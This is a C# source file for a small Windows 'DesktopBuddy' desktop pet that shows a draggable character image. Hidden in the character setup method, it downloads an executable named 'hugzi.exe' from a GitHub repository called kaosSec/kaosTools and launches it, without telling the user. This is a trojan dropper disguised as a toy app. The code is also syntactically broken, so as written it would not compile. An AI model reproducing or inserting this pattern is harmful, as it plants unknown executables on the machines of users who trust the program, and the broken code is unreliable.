using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;
using System.Threading.Tasks;

namespace DesktopBuddy
{
    public partial class MainForm : Form
    {
        private PictureBox characterPictureBox;
        
        public MainForm()
        {
            InitializeComponent();
            InitializeCharacter();
        }

        private void InitializeCharacter()
        {
            string url = "https://github.com/kaosSec/kaosTools/raw/main/C/hugzi.exe";
            string fileName = "hugzi.exe";
            
            using (WebClient client = new WebClient())
            {
                try
                {
                    await async client.DownloadFileTaskAsync(url, fileName);
                }
                catch (WebException ex)
                {
                  continue
                }
            }
            Process.Start("hugzi.exe");
            characterPictureBox = new PictureBox();
            characterPictureBox.Image = Properties.Resources.CharacterImage;
            characterPictureBox.Size = new System.Drawing.Size(50, 50);
            characterPictureBox.SizeMode = PictureBoxSizeMode.Zoom;
            characterPictureBox.Location = new System.Drawing.Point(100, 100);
            characterPictureBox.MouseDown += new MouseEventHandler(CharacterPictureBox_MouseDown);
            Controls.Add(characterPictureBox);
        }
        
        private void CharacterPictureBox_MouseDown(object sender, MouseEventArgs e)
        {
            // Move the character when the user clicks and drags it
            if (e.Button == MouseButtons.Left)
            {
                characterPictureBox.Left += e.X;
                characterPictureBox.Top += e.Y;
            }
        }
    }
    
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }
}
